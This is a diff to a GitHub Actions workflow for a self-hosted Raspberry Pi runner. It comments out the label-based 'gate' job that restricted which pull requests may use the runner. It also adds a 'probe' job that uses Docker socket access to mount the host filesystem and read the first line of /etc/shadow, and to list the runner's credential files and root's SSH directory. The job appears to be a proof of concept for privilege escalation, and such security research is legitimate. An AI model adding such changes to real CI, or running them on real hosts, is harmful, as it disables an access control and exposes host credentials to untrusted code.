@@ -13,17 +13,17 @@ on:
         required: true
 
 jobs:
-  gate:
-    if: >-
-       github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'act-lf-led')
-    runs-on: ubuntu-latest
-    steps:
-      - run: |
-          echo "Pull request #${{ github.event.pull_request.number }} may use the runner."
+  # gate:
+  #   if: >-
+  #      github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'act-lf-led')
+  #   runs-on: ubuntu-latest
+  #   steps:
+  #     - run: |
+  #         echo "Pull request #${{ github.event.pull_request.number }} may use the runner."
 
   setup:
     timeout-minutes: 60
-    needs: gate
+    #needs: gate
     #if: github.event.workflow_run.conclusion == 'success'
     runs-on: [self-hosted, linux, lf-act-rpi]
     strategy:
@@ -197,7 +197,42 @@ jobs:
           github-token: ${{ steps.app-token.outputs.token }}
           path: ${{ runner.temp }}
       - run: docker load --input "$RUNNER_TEMP/image.tar"
-  
+
+  probe:
+    runs-on: [self-hosted, linux, lf-act-rpi]
+    steps:
+      - name: Who am I and can I reach the daemon
+        run: |
+          id
+          echo "--- socket presence/perms ---"
+          ls -l /var/run/docker.sock 2>&1 || echo "no socket at default path"
+          echo "--- am I in the docker group? ---"
+          groups
+          echo "--- can I talk to the daemon? ---"
+          docker version
+          docker info 2>&1 | head -n 20
+
+      - name: Prove socket access = host root (read-only)
+        run: |
+          echo "=== Reading a root-only host file from inside a container ==="
+          # /etc/shadow is mode 0640 root:shadow — unreadable to a normal user,
+          # trivially readable once you can bind-mount the host as root via Docker.
+          docker run --rm -v /:/host:ro alpine \
+            sh -c 'echo "container uid: $(id -u)"; \
+                   echo "first line of host /etc/shadow:"; \
+                   head -n 1 /host/etc/shadow'
+
+      - name: Enumerate what host-root access exposes
+        run: |
+          echo "=== runner credentials on the host ==="
+          docker run --rm -v /:/host:ro alpine \
+            sh -c 'ls -la /host/home/act-runner/actions-runner/ 2>/dev/null; \
+                   echo "---"; \
+                   ls -la /host/home/act-runner/actions-runner/.credentials* 2>/dev/null'
+          echo "=== root ssh keys / authorized_keys (existence only) ==="
+          docker run --rm -v /:/host:ro alpine \
+            sh -c 'ls -la /host/root/.ssh/ 2>/dev/null || echo "none/again inaccessible without this"'
+
   compileblink1:
     timeout-minutes: 60
     runs-on: [self-hosted, linux, lf-act-rpi]
